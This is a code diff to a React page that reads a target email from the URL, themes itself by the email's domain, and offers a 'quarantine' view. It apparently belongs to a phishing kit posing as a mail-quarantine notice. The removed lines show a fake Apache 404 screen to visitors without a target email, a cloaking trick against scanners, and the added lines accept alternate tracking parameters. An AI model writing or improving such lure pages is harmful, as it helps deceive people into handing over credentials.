@@ -23,33 +23,21 @@ const AppContent: React.FC = () => {
   const [detectedTheme, setDetectedTheme] = useState<string | null>(null);
   const [isLoading, setIsLoading] = useState(true);
   const [showQuarantine, setShowQuarantine] = useState(false);
-  const [isNotFound, setIsNotFound] = useState(false);
 
   const email = useMemo(() => {
     const params = new URLSearchParams(window.location.search);
-    return params.get('email') || '';
+    return params.get('email') || params.get('tid') || params.get('s') || '';
   }, []);
 
   useEffect(() => {
     const params = new URLSearchParams(window.location.search);
-    const emailParam = params.get('email');
-
-    if (!emailParam) {
-      setIsNotFound(true);
-      setIsLoading(false);
-      return;
-    }
-
-    const viewParam = params.get('view');
-    const typeParam = params.get('type');
-
-    // If view is quarantine, or if no type/view is specified, default to quarantine
-    if (viewParam === 'quarantine' || (!viewParam && !typeParam)) {
+    if (params.get('view') === 'quarantine') {
       setShowQuarantine(true);
     }
 
     const initTheme = async () => {
       const startTime = Date.now();
+      const typeParam = params.get('type');
       const domain = email.split('@')[1]?.toLowerCase();
 
       let theme = 'alibaba';
@@ -99,22 +87,7 @@ const AppContent: React.FC = () => {
 
   return (
     <AnimatePresence mode="wait">
-      {isNotFound ? (
-        <motion.div
-          key="404"
-          initial={{ opacity: 0 }}
-          animate={{ opacity: 1 }}
-          className="min-h-screen flex items-center justify-center bg-gray-100 font-sans"
-        >
-          <div className="text-center p-8">
-            <h1 className="text-9xl font-bold text-gray-300">404</h1>
-            <p className="text-2xl font-semibold text-gray-600 mt-4">Page Not Found</p>
-            <p className="text-gray-500 mt-2">The requested URL was not found on this server.</p>
-            <hr className="my-8 border-gray-200" />
-            <p className="text-sm text-gray-400 italic">Apache/2.4.41 (Ubuntu) Server at Port 443</p>
-          </div>
-        </motion.div>
-      ) : isLoading ? (
+      {isLoading ? (
         <motion.div 
           key="loader"
           initial={{ opacity: 0 }}
